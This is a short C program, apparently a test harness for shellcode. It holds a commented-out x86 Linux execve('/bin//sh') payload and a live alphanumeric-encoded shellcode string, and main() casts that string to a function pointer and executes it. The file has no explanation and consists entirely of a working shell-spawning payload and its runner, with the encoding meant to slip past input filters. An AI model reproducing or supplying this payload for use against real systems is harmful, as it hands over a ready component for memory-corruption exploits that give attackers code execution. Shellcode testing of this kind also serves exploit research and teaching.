#include <stdio.h>
#include <string.h>

//char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
//"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

char *shellcode = "IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIdqKp2p1xtofOSCaxE8ToarCY2NnijC2paClI9qx0FkjmMPFjAA";

int main(void)
{
    fprintf(stdout,"Length: %d\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
    return 0;
}


